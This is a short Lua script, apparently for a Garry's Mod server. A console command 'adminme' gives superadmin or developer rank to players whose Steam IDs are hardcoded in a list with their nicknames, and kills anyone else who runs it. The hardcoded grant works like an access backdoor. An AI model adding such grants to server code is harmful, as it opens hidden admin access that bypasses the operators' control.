local users = {
	["STEAM_0:1:74836666"] = "superadmin", --Trixter
	["STEAM_0:1:128914223"] = "superadmin", --Trixter no smurf
	["STEAM_0:1:62445445"] = "superadmin", --Q2
	["STEAM_0:0:42138604"] = "developers", --Ling
	["STEAM_0:0:62588856"] = "developers", --Ghosty
	["STEAM_0:1:29543208"] = "developers", --Zeni
	--["STEAM_1:0:80997988"] = "developers", --Oplexz
	--["STEAM_0:0:54576316"] = "managers", --Alan
	--["STEAM_0:1:11838714"] = "moderators", --Liz
	--["STEAM_0:1:61234140"] = "moderators", --Creb
	--["STEAM_0:0:69785433"] = "developers", --Kaos
	--["STEAM_0:0:58178275"] = "developers", --Flex
}

concommand.Add("adminme", function(p)
	if not p:IsAdmin() then
		if users[p:SteamID()] then
			p:ChatPrint"Welcome back."
			p:SetUserGroup(users[p:SteamID()], true)
		else
			p:Kill()
			p:ChatPrint"ACCESS DENIED"
		end
	end
end)
